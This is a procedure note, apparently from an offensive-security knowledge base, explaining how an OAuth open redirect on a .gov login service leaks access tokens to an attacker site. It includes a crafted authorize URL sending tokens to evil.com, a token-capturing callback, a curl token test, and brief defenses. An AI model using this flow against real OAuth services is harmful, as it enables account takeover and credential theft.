---
id: c3d4e5f6-g7h8-9012-cdef-345678901234
tags:
  - oauth
  - token-leak
  - account-takeover
type: procedure
tools: []
tactics:
  - '[[Credential Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Steal Application Access Token]]'
updated_at: '2025-12-14T17:24:38.857Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Steal Application Access Token]]'
---
# Authenticate-via-OAuth-to-Leak-Access-Token

## Summary

This procedure simulates or observes the victim's authentication through the malicious OAuth flow, resulting in the access token being leaked via the unvalidated redirect to an attacker-controlled site, enabling subsequent account takeover.

## Description

After clicking the crafted link, the victim is redirected to the OAuth authorization endpoint, where they select and log in with a .gov account via the identity provider (https://idp.fr.cloud.gov). Due to the open redirect, successful authentication appends the OAuth access token to the malicious redirect_uri URL (e.g., in the fragment: #access_token=TOKEN). The attacker's site captures this, allowing use of the token for unauthorized access to the victim's account resources.

## Requirements

1. Valid .gov account credentials for testing (or victim to provide)
2. Attacker-controlled endpoint (e.g., evil.com/auth/callback) configured to log incoming requests and extract tokens from URL fragments
3. Access to the crafted link from the prior procedure

## Defense

Defensive measures and detection strategies:

- Enforce redirect_uri validation with domain allowlists on the OAuth server
- Log and alert on redirects to untrusted domains
- Use short-lived tokens and monitor for anomalous token usage post-leak

## Objectives

1. Complete authentication to trigger the redirect
2. Capture the leaked access token on the attacker side
3. Validate token usability for account takeover

## Instructions

### Step 1: Access the Malicious Link and Initiate Login

**Context**: Have the victim (or test account) click the crafted OAuth link to load the authorization page.

No command; browser access: https://login.fr.cloud.gov/oauth/authorize?client_id=███&response_type=token&redirect_uri=https%3A%2F%2Fevil.com%2Fauth%2Fcallback&state=███

> The page should prompt selection of an identity provider. Proceed to login.

### Step 2: Authenticate with .gov Account

**Context**: Log in using valid .gov credentials via the identity provider to obtain the access token.

Select https://idp.fr.cloud.gov and enter credentials.

> Upon successful authentication, the browser redirects to evil.com with the token in the URL fragment.

### Step 3: Capture and Validate the Leaked Token

**Context**: Monitor the attacker-controlled site to extract and test the token.

Configure your callback endpoint to log the full URL, then parse #access_token=VALUE.

> Test the token by making API calls to protected resources (e.g., curl -H "Authorization: Bearer TOKEN" https://api.example.gov/user). Success confirms leakage and takeover potential.

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access]] Credential Access

### Techniques

- [[Steal Application Access Token]] Steal Application Access Token

### Sub-Techniques

- None

## Commands Used

- None

## Tools Used

- None

## Tags

- [[oauth]]
- [[token-leak]]
- [[account-takeover]]
